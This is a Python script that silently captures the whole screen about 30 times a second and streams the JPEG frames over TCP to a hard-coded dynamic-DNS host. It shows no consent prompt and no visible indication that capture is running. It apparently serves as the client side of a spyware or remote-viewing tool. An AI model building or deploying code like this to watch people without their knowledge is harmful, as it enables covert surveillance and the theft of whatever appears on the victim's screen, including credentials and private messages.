import socket
import cv2
import numpy as np
import pyautogui
import struct
import threading
import time
from queue import Queue, Full, Empty

# Queues for storing encoded images
primary_queue = Queue(maxsize=10)
backup_queue = Queue(maxsize=10)

def capture_screen():
    """Capture the screen and return it as a frame."""
    screen = pyautogui.screenshot()
    frame = np.array(screen)
    frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
    return frame

def capture_thread():
    capture_interval = 0.033  # Capture 3 times faster (1/3 of 0.1 seconds)
    while True:
        try:
            # Capture the screen
            frame = capture_screen()

            # Encode the frame as JPEG
            _, img_encoded = cv2.imencode('.jpg', frame)
            data = img_encoded.tobytes()

            try:
                # Try to put data in the primary queue
                primary_queue.put(data, timeout=1)
            except Full:
                # If primary queue is full, put data in the backup queue
                try:
                    backup_queue.put(data, timeout=1)
                except Full:
                    print("Both queues are full, dropping frame.")
            
            # Wait before capturing the next frame
            time.sleep(capture_interval)
        except Exception as e:
            print(f"Error capturing screenshot: {e}")
            break

def send_thread(client_socket):
    while True:
        try:
            try:
                # Try to get data from the primary queue
                data = primary_queue.get(timeout=1)
            except Empty:
                # If primary queue is empty, try the backup queue
                try:
                    data = backup_queue.get(timeout=1)
                except Empty:
                    time.sleep(0.01)  # Wait if both queues are empty
                    continue

            # Send the size of the data first
            client_socket.sendall(struct.pack("L", len(data)))

            # Send the actual data
            client_socket.sendall(data)
        except Exception as e:
            print(f"Error sending data: {e}")
            break

def main():
    SERVER_IP = '2b2tcracked.ddns.net'  # Replace with the server's IP address
    SERVER_PORT = 6700

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((SERVER_IP, SERVER_PORT))

        # Start threads for capturing and sending
        capture_thread_instance = threading.Thread(target=capture_thread, daemon=True)
        send_thread_instance = threading.Thread(target=send_thread, args=(client_socket,), daemon=True)

        capture_thread_instance.start()
        send_thread_instance.start()

        capture_thread_instance.join()
        send_thread_instance.join()
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Exiting...")
